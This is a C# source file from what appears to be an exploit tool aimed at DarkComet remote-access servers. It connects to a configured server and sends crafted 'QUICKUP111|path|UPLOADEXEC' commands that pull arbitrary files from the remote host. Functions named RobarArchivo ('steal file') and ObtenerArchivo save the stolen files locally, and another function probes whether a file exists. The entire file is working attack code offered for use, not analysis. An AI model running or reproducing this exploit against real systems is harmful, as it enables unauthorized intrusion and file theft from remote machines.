using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace DarkComet_Fucker
{
    class Connection
    {
        public static Socket sock = null;

        public static void startSocket()
        {
            try
            {
                //if (sock.Connected) { sock.Close(); System.Threading.Thread.Sleep(1000); }
                //if (sock != null) { sock.Close(); sock = null;  System.Threading.Thread.Sleep(500); }
                //if (IsSocketConnected()) { sock.Close(); }

                IPAddress ipAdd = System.Net.IPAddress.Parse(Utils.serverIP);
                IPEndPoint remoteEP = new IPEndPoint(ipAdd, Utils.serverPort);

                sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP);
                sock.NoDelay = true;
                sock.ReceiveTimeout = 100;
                sock.Connect(remoteEP);
            }
            catch (Exception e) { }
        }

        public static string readString()
        {
            return System.Text.Encoding.UTF8.GetString(readBytes()).Replace("\0", string.Empty);
        }

        public static long readLong()
        {
            return BitConverter.ToInt64(readBytes(), 0);
        }

        public static byte[] readBytes()
        {
            byte[] buffer = new byte[1024];
            try
            {
                int rec = sock.Receive(buffer, 0, buffer.Length, 0);
                Array.Resize(ref buffer, rec);
            }
            catch (Exception ex) { }
            return buffer;
        }

        public static bool RobarArchivo(long file_length, string filename)
        {
            byte[] buffer = new byte[1024 * 8];
            int rec = 1, total_bytes = 0;

            if(File.Exists(filename)) File.Delete(filename);
            BinaryWriter bWrite = new BinaryWriter(File.Open(filename, FileMode.Append));

            try
            {
                while (true)
                {
                    rec = sock.Receive(buffer, 0, 8192, SocketFlags.None);
                    bWrite.Write(buffer, 0, rec);
                    total_bytes += rec;
                    sock.Send(System.Text.Encoding.ASCII.GetBytes("GIMME MOAR PL4X"));
                }

            }
            catch (SocketException ex) {  };
            bWrite.Close();

            return File.Exists(filename);
        }

        public static bool ObtenerArchivo(string source, string dest)
        {
            bool ret = false;
            Connection.startSocket();
            Connection.readString();
            Connection.sendString(Utils.encrypt("QUICKUP111|" + source + "|UPLOADEXEC"));
            Connection.readString();

            Connection.sendString(Utils.encrypt("A"));
            string file_exist = Connection.readString();
            if (!String.IsNullOrEmpty(file_exist))
            {
                long file_len = Convert.ToInt64(file_exist);
                if (file_len > 0)
                {
                    Connection.sendString(Utils.encrypt("A"));
                    ret = Connection.RobarArchivo(file_len, dest);
                }
            }
            return ret;
        }

        public static void RobarArchivoSinGuardar(long file_length)
        {
            byte[] buffer = new byte[1024 * 8];
            int rec = 1, total_bytes = 0;

            try
            {
                while (true)
                {
                    rec = sock.Receive(buffer, 0, 8192, SocketFlags.None);
                    total_bytes += rec;
                    sock.Send(System.Text.Encoding.ASCII.GetBytes("GIMME MOAR PL4X"));
                }

            }
            catch (SocketException ex) { /*break;*/ };
        }

        public static bool ArchivoExiste(string filename)
        {
            bool ret = false;
            Connection.startSocket();

            Connection.readString();
            Connection.sendString(Utils.encrypt("QUICKUP111|" + filename + "|UPLOADEXEC"));
            Connection.readString();

            Connection.sendString(Utils.encrypt("A"));
            string file_exist = Connection.readString();
            if (!String.IsNullOrEmpty(file_exist))
            {
                long file_len = Convert.ToInt64(file_exist);
                if (file_len > 0)
                {
                    Connection.sendString(Utils.encrypt("A"));
                    Connection.RobarArchivoSinGuardar(file_len);
                    ret = true;
                }
            }
            return ret;
        }

        public static void sendString(string str)
        {
            sendBytes(System.Text.Encoding.UTF8.GetBytes(str));
        }

        public static void sendBytes(byte[] send)
        {
            sock.Send(send);
        }

        public static bool IsSocketConnected() //http://stackoverflow.com/questions/2661764/how-to-check-if-a-socket-is-connected-disconnected-in-c
        {
            return !((sock.Poll(1000, SelectMode.SelectRead) && (sock.Available == 0)) || !sock.Connected);
        }
    }
}
